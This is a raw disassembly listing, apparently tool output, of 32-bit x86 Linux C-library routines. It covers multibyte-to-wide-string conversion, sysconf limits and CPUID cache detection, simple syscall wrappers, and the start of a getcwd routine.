mov eax, dword [arg_18h]
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8078738
mov edi, dword [eax]
mov eax, dword [arg_8h]
test eax, eax
je 0x8078650
mov eax, dword [arg_ch]
mov edx, dword [arg_8h]
test esi, esi
mov ecx, 5
mov ebx, dword [eax]
mov dword [var_3ch], edx
lea eax, [edx + esi*4]
mov dword [var_38h], eax
mov dword [var_150h], ebx
je 0x8078642
mov eax, dword [var_150h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08076f30
lea esi, [eax + ebx + 1]
mov eax, dword [edi + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_148h]
lea edx, [var_150h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_3ch]
mov dword [var_ch], esi
mov dword [var_8h], edx
mov dword [var_4h], eax
mov dword [esp], edi
call dword [edi + 0x14]
cmp eax, 4
mov ecx, eax
je 0x8078520
cmp eax, 7
jne 0x8078642
mov ebx, dword [var_150h]
cmp ebx, esi
jne 0x807863a
cmp byte [ebx - 1], 0
je 0x807863a
mov eax, dword [var_38h]
mov edx, dword [var_3ch]
sub eax, edx
sar eax, 2
test eax, eax
mov esi, eax
jne 0x80784b2
mov esi, edx
mov eax, dword [arg_ch]
sub esi, dword [arg_8h]
mov dword [eax], ebx
sar esi, 2
test ecx, ecx
je 0x80785d1
cmp ecx, 4
je 0x80785d1
test ecx, ecx
jne 0x8078574
add esp, 0x168
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
cmp ecx, 4
jne 0x807859e
test ecx, ecx
je 0x8078567
cmp ecx, 5
je 0x8078567
cmp ecx, 4
je 0x8078567
cmp ecx, 7
je 0x8078567
call fcn.08048b20
mov esi, 0xffffffff
mov dword [eax], 0x54
jmp 0x8078567
cmp ecx, 6
je 0x8078579
cmp ecx, 7
je 0x8078579
cmp ecx, 5
je 0x8078579
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x9b
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.status____GCONV_OK__status____GCONV_EMPTY_INPUT__status____GCONV_ILLEGAL_INPUT__status____GCONV_INCOMPLETE_INPUT__status____GCONV_FULL_OUTPUT
call fcn.0805efc0
mov edx, dword [arg_8h]
mov edx, dword [edx + esi*4 - 4]
test edx, edx
jne 0x8078563
test esi, esi
je 0x8078619
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x80785f8
mov eax, dword [arg_ch]
mov dword [eax], 0
dec esi
jmp 0x8078563
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x90
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__data.__statep_____count__0_
jmp 0x80785cc
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x8f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.result___0
jmp 0x80785cc
mov edx, dword [var_3ch]
jmp 0x807854d
mov edx, dword [var_3ch]
mov ebx, dword [var_150h]
jmp 0x807854d
mov eax, dword [arg_ch]
xor esi, esi
mov ebx, dword [eax]
mov dword [var_14ch], ebx
mov dword [esp], ebx
call fcn.08053400
lea ebx, [eax + ebx + 1]
mov eax, dword [var_28h]
mov dword [var_154h], ebx
lea ebx, [var_13ch]
mov edx, dword [eax + 4]
mov eax, dword [eax]
mov dword [var_140h], edx
mov dword [var_144h], eax
lea edx, [var_3ch]
lea eax, [var_144h]
mov dword [var_38h], edx
mov dword [var_28h], eax
mov eax, dword [edi + 0x14]
mov dword [var_3ch], ebx
mov dword [esp], eax
call fcn.08083520
mov edx, dword [var_154h]
lea eax, [var_148h]
mov dword [var_sp_1ch], 1
mov dword [var_14h], eax
mov dword [var_18h], 0
mov dword [var_10h], 0
lea eax, [var_14ch]
mov dword [esp], edi
mov dword [var_ch], edx
mov dword [var_8h], eax
lea edx, [var_3ch]
mov dword [var_4h], edx
call dword [edi + 0x14]
mov edx, dword [var_3ch]
mov ecx, eax
mov eax, edx
sub eax, ebx
sar eax, 2
add esi, eax
cmp ecx, 5
je 0x8078698
test ecx, ecx
je 0x8078709
cmp ecx, 4
jne 0x8078563
mov ebx, dword [edx - 4]
test ebx, ebx
je 0x80785f2
mov dword [var_ch], str.__mbsrtowcs_l
mov dword [var_8h], 0x5f
mov dword [var_4h], str.mbsrtowcs_l.c
mov dword [esp], str.__wchar_t___data.__outbuf___1___L0
jmp 0x80785cc
cmp ebx, 0x809ff60
mov eax, 0x8092dec
je 0x8078481
mov eax, ebx
call fcn.08053a60
mov eax, dword [ebx + 0x14]
jmp 0x8078481
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
sub esp, 8
test eax, eax
mov dword [ebp - 4], ebx
je 0x80787a3
mov dword [esp], 0x80a9be0
call section.
mov ebx, dword [ebp - 4]
leave
ret
mov eax, 2
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80787b7
mov eax, ebx
jmp 0x807879e
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x80787b3
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078815
mov eax, 0x18
int 0x80
leave
ret
mov eax, 0xc7
int 0x80
cmp eax, 0xfffff000
jbe 0x8078813
cmp eax, 0xffffffda
jne 0x8078813
mov dword [0x80a9c10], 1
jmp 0x807880c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078855
mov eax, 0x31
int 0x80
leave
ret
mov eax, 0xc9
int 0x80
cmp eax, 0xfffff000
jbe 0x8078853
cmp eax, 0xffffffda
jne 0x8078853
mov dword [0x80a9c10], 1
jmp 0x807884c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x8078895
mov eax, 0x2f
int 0x80
leave
ret
mov eax, 0xc8
int 0x80
cmp eax, 0xfffff000
jbe 0x8078893
cmp eax, 0xffffffda
jne 0x8078893
mov dword [0x80a9c10], 1
jmp 0x807888c
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov eax, dword [0x80a9c10]
push ebp
mov ebp, esp
test eax, eax
jle 0x80788d5
mov eax, 0x32
int 0x80
leave
ret
mov eax, 0xca
int 0x80
cmp eax, 0xfffff000
jbe 0x80788d3
cmp eax, 0xffffffda
jne 0x80788d3
mov dword [0x80a9c10], 1
jmp 0x80788cc
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [var_8h_2]
sub eax, 0xb9
cmp eax, 0xd
ja case.default.0x8078913
jmp dword [eax*4 + 0x80a2e60]
mov eax, 0x2000
nop
leave
ret
xor eax, eax
jmp 0x8078920
mov eax, 0x10
jmp 0x8078920
mov eax, 0xffffffff
jmp 0x8078920
mov eax, str.cannot_happen
test eax, eax
je case.0x8078913.191
mov dword [var_4h_2], str.handle_i486
mov dword [var_8h_3], 0x3d
mov dword [var_ch_2], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.___cannot_happen_
call fcn.0805efc0
jmp 0x8078970
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
mov eax, dword [var_8h_3]
mov edx, dword [eax]
mov eax, dword [var_ch_2]
cmp dword [eax], edx
je 0x8078986
sbb eax, eax
or eax, 1
leave
ret
xor eax, eax
jmp 0x8078984
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x34
mov ebx, dword [arg_ch]
mov edi, dword [arg_8h]
test ebx, ebx
js 0x8078a17
lea ecx, [edi - 0xb9]
mov edx, 0x55555556
mov eax, ecx
imul edx
mov eax, ecx
sar eax, 0x1f
sub edx, eax
test ebx, ebx
lea esi, [edx + edx*2 + 0xb9]
je 0x8078a15
movzx eax, bl
cmp eax, 0x40
je 0x8078a44
mov dword [var_2ch], eax
mov dword [var_10h], 0x8078970
mov dword [var_ch], 0x14
lea eax, [var_2ch]
mov dword [var_8h], 0x1f
mov dword [var_4h], 0x80a2ea0
mov dword [esp], eax
call fcn.08062e40
test eax, eax
je 0x8078a10
mov edx, dword [eax + 4]
cmp edx, esi
je 0x8078a27
cmp edx, 0xbf
je 0x8078a1f
nop
shr ebx, 8
jne 0x80789c6
xor eax, eax
add esp, 0x34
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_ch]
mov byte [eax], 1
jmp 0x8078a10
sub edi, edx
je 0x8078a3f
cmp edi, 1
je 0x8078a3a
cmp edi, 2
jne 0x8078a54
mov eax, dword [eax + 0x10]
jmp 0x8078a17
mov eax, dword [eax + 0xc]
jmp 0x8078a17
mov eax, dword [eax + 8]
jmp 0x8078a17
mov eax, dword [arg_14h]
cmp esi, 0xc2
mov byte [eax], 1
jne 0x8078a10
jmp 0x8078a15
mov dword [var_ch], str.intel_check_word
mov dword [var_8h], 0xad
mov dword [var_4h], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.offset__2
call fcn.0805efc0
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
cmp dword [var_8h], 1
jbe 0x8078b60
mov dword [var_18h], 1
mov byte [var_dh], 0
mov byte [var_eh], 0
mov dword [var_14h], 1
lea edi, [var_dh]
lea esi, [var_eh]
nop
mov eax, 2
xchg ebx, ebx
cpuid
xchg ebx, ebx
cmp dword [var_14h], 1
mov dword [var_20h], edx
mov dword [var_1ch], ecx
je 0x8078b71
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], ebx
mov dword [esp], eax
call fcn.08078990
test eax, eax
jne 0x8078b62
mov edx, dword [var_1ch]
mov ecx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], edx
mov dword [esp], ecx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_20h]
mov edx, dword [var_4h]
mov dword [var_ch_2], edi
mov dword [var_8h_2], esi
mov dword [var_4h_2], eax
mov dword [esp], edx
call fcn.08078990
test eax, eax
jne 0x8078b62
mov eax, dword [var_14h]
inc dword [var_14h]
cmp eax, dword [var_18h]
jb 0x8078ab0
mov eax, dword [var_4h]
sub eax, 0xbf
cmp eax, 5
ja 0x8078b60
cmp byte [var_dh], 0
jne 0x8078b6a
nop
xor eax, eax
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, 0xffffffff
jmp 0x8078b62
movzx edx, al
xor al, al
mov dword [var_18h], edx
jmp 0x8078acb
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_ch_2], ebx
mov dword [var_4h_2], edi
mov dword [var_8h_3], esi
mov ebx, 0x80000000
mov edi, dword [var_8h_2]
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
xor ecx, ecx
cmp edi, 0xc1
mov dword [var_4h_3], eax
jg 0x8078c00
xor ebx, ebx
cmp edi, 0xbf
setge bl
sub ebx, 0x7ffffffb
cmp dword [var_4h_3], ebx
jb 0x8078c00
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
cmp edi, 0xbb
mov dword [var_14h_2], edx
mov ebx, ecx
jg 0x8078bdc
add edi, 3
mov ebx, edx
lea eax, [edi - 0xbc]
cmp eax, 5
ja case.default.0x8078beb
jmp dword [eax*4 + 0x80a310c]
mov ecx, ebx
shr ecx, 0xe
and ecx, 0x3fc00
lea esi, [esi]
mov ebx, dword [var_sp_ch]
mov esi, dword [var_34h]
mov eax, ecx
mov edi, dword [var_30h]
leave
ret
shr ebx, 0x10
movzx eax, bl
cmp eax, 0xff
mov ecx, eax
jne 0x8078c00
lea ecx, [ebx*4]
jmp 0x8078bf7
movzx ecx, bl
jmp 0x8078c00
xor eax, eax
test bx, 0xf000
je 0x8078c3d
mov eax, ebx
shr eax, 6
and eax, 0x3fffc00
mov ecx, eax
jmp 0x8078c00
shr ebx, 0xc
mov eax, ebx
and eax, 0xf
cmp eax, 0xf
ja case.0x8078c4e.3
jmp dword [eax*4 + 0x80a3124]
mov ecx, ebx
and ecx, 0xf
jmp 0x8078c00
mov ecx, 8
jmp 0x8078c00
mov ecx, 0x10
jmp 0x8078c00
xor ecx, ecx
jmp 0x8078c00
mov ecx, ebx
shl ecx, 6
and ecx, 0x3fffc00
jmp 0x8078c00
movzx eax, bl
xor ecx, ecx
test bx, 0xf000
cmovne ecx, eax
jmp 0x8078c00
mov eax, str.cannot_happen
mov ecx, 0xffffffff
test eax, eax
je 0x8078c00
mov dword [var_8h_4], str.handle_amd
mov dword [var_ch_3], 0x13c
mov dword [var_10h], str..._sysdeps_unix_sysv_linux_i386_sysconf.c
mov dword [esp], str.___cannot_happen_
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_8h]
lea eax, [edi - 0xb9]
cmp eax, 0xe
ja 0x8078d98
pushfd
pop eax
mov edx, 0x240000
xor edx, eax
push edx
popfd
pushfd
pop edx
xor edx, eax
push eax
popfd
test edx, edx
mov eax, 0xffffffff
je 0x8078d39
and edx, 0x200000
je 0x8078d86
xor ebx, ebx
mov eax, ebx
xchg esi, ebx
cpuid
xchg esi, ebx
cmp esi, 0x756e6547
mov dword [var_2ch], edx
mov dword [var_14h], ecx
mov dword [var_10h], esi
je 0x8078d68
cmp dword [var_10h], 0x68747541
je 0x8078d44
xor eax, eax
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
ret
cmp dword [var_14h], 0x444d4163
jne 0x8078d37
cmp dword [var_2ch], 0x69746e65
jne 0x8078d37
mov dword [var_ch_2], edi
mov ebx, dword [var_ch_3]
mov esi, dword [var_8h_4]
mov edi, dword [var_4h_3]
leave
jmp 0x8078b80
cmp ecx, 0x6c65746e
jne 0x8078d2e
cmp edx, 0x49656e69
jne 0x8078d2e
mov dword [esp + 4], eax
mov dword [esp], edi
call fcn.08078a80
jmp 0x8078d39
mov dword [var_8h_2], edi
mov ebx, dword [var_ch_2]
mov esi, dword [var_8h_3]
mov edi, dword [var_4h_2]
leave
jmp 0x8078900
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8078db0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x38
cmp dword [var_8h_2], 3
je 0x8078eb4
cmp dword [var_8h_2], 0x22
je 0x8078ddc
mov edx, dword [var_8h_2]
mov dword [esp], edx
call fcn.08078ec0
add esp, 0x38
pop ebx
pop esi
pop edi
leave
ret
mov ebx, str._proc_sys_kernel_rtsig_max
test ebx, ebx
je 0x8078dc9
xor ecx, ecx
mov eax, 5
int 0x80
cmp eax, 0xfffff000
mov esi, eax
ja 0x8078ea1
cmp esi, 0xffffffff
je 0x8078dc9
lea edi, [var_2ch]
mov ebx, esi
mov ecx, edi
mov edx, 0x1f
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov dword [var_34h], eax
ja 0x8078e88
cmp dword [var_34h], 0xffffffff
jne 0x8078e2d
call fcn.08048b20
cmp dword [eax], 4
je 0x8078e03
mov ebx, esi
mov eax, 6
int 0x80
mov eax, dword [var_34h]
test eax, eax
jle 0x8078dc9
mov eax, dword [var_34h]
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], 0xa
mov dword [esp], edi
mov byte [eax + ebp - 0x2c], 0
lea eax, [var_30h]
mov dword [var_sp_4h], eax
call fcn.080494c0
mov edx, dword [var_30h]
cmp edx, edi
je 0x8078dc9
movzx edx, byte [edx]
test dl, dl
je 0x8078dd4
cmp dl, 0xa
jne 0x8078dc9
jmp 0x8078dd4
call fcn.08048b20
neg dword [var_34h]
mov edx, dword [var_34h]
mov dword [var_34h], 0xffffffff
mov dword [eax], edx
jmp 0x8078e1d
neg esi
call fcn.08048b20
mov dword [eax], esi
mov esi, 0xffffffff
jmp 0x8078dfb
mov ebx, str._proc_sys_kernel_ngroups_max
jmp 0x8078de1
mov esi, esi
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
cmp eax, 0xc6
ja case.0x8078ecd.41
jmp dword [eax*4 + 0x80a3164]
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
leave
ret
mov eax, 0x20000
jmp 0x8078ee4
mov eax, 0x3e7
jmp 0x8078ee4
leave
jmp loc.0807ac30
mov eax, 0x20
jmp 0x8078ee4
leave
jmp loc.0807a020
mov eax, 0x10
jmp 0x8078ee4
call fcn.0808dee0
cmp eax, 6
jle 0x8078f1e
leave
jmp fcn.0808dee0
mov eax, 6
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x8000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
leave
jmp fcn.080546b0
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x63
jmp 0x8078ee4
mov eax, 0x3e8
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x100
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 0x400
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x4000
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
leave
jmp fcn.0807a930
leave
jmp fcn.0807a930
leave
jmp fcn.0807ac10
leave
jmp fcn.0807ac20
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x2000
jmp 0x8078ee4
mov eax, 0x1f4
jmp 0x8078ee4
mov eax, 4
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 8
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x80000000
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x20
jmp 0x8078ee4
mov eax, 0x10
jmp 0x8078ee4
mov eax, 0x14
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0x7f
jmp 0x8078ee4
mov eax, 0xffffff80
jmp 0x8078ee4
mov eax, 0x7fff
jmp 0x8078ee4
mov eax, 0xffff8000
jmp 0x8078ee4
mov eax, 0xff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffff
jmp 0x8078ee4
mov eax, 0x1000
jmp 0x8078ee4
mov eax, 0x800
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 0x7fffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x30db0
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 1
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0x40
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
mov eax, 0xffffffff
jmp 0x8078ee4
xor eax, eax
jmp 0x8078ee4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x5c
mov eax, dword [0x80aad2c]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_ch]
mov esi, dword [arg_10h]
test eax, eax
jne 0x8079684
call fcn.08048b20
mov ecx, esi
mov dword [var_50h], eax
mov edi, dword [eax]
mov eax, 0xc3
int 0x80
cmp eax, 0xfffff000
ja 0x80796c6
cmp eax, 0xffffffff
mov edx, eax
je 0x807966d
test edx, edx
jne 0x8079660
mov eax, dword [esi + 0x58]
cmp dword [esi + 0xc], eax
je 0x8079660
mov eax, dword [esi + 0xc]
mov dword [esi + 0x5c], 0
mov dword [esi + 0x58], eax
lea esi, [esi]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov eax, edx
mov edi, dword [var_4h]
leave
ret
mov ecx, dword [var_50h]
cmp dword [ecx], 0x26
jne 0x8079643
mov edx, dword [var_50h]
mov dword [edx], edi
mov dword [0x80aad2c], 1
lea edi, [var_4ch]
mov ecx, edi
mov eax, 0x6a
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x80796b6
test ebx, ebx
mov edx, ebx
jne 0x8079660
mov eax, dword [arg_8h]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], edi
mov dword [esp], eax
call fcn.08054430
mov edx, eax
jmp 0x8079660
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079699
mov edx, dword [var_50h]
neg eax
mov dword [edx], eax
mov eax, 0xffffffff
jmp 0x807963c
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0x21
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
push ebp
mov ebp, esp
sub esp, 0x24
mov eax, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
mov dword [var_10h], eax
mov eax, dword [0x80aa9d4]
test eax, eax
je 0x807972f
mov ecx, dword [0x80aa9d8]
test ecx, ecx
je 0x8079914
mov edi, dword [var_10h]
test edi, edi
jne 0x8079743
test esi, esi
mov edi, 0x1000
jne 0x8079904
test esi, esi
mov dword [var_14h], esi
je 0x80798e2
test eax, eax
jne 0x80797ca
mov ebx, dword [var_14h]
mov ecx, edi
mov eax, 0xb7
int 0x80
cmp eax, 0xfffff000
mov dword [var_18h], eax
ja 0x80798c9
mov eax, dword [var_18h]
test eax, eax
js 0x80797a9
test esi, esi
je 0x8079784
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov ebx, dword [var_10h]
test ebx, ebx
je 0x8079793
test esi, esi
cmove esi, dword [var_14h]
jmp 0x8079777
mov ecx, dword [var_18h]
mov dword [var_sp_4h], ecx
mov ebx, dword [var_14h]
mov dword [esp], ebx
call fcn.08051220
mov esi, eax
jmp 0x807978b
call fcn.08048b20
mov eax, dword [eax]
cmp eax, 0x26
je 0x80798b0
cmp eax, 0x22
jne 0x80798a0
test esi, esi
je 0x80797ca
xor eax, eax
jmp 0x8079779
lea ebx, [edi - 1]
mov dword [var_sp_8h], ebx
mov edx, dword [var_14h]
mov dword [esp], 0x80a3480
mov dword [var_sp_4h], edx
call fcn.08079f10
cmp eax, 0xffffffff
je 0x80797fb
mov ecx, dword [var_14h]
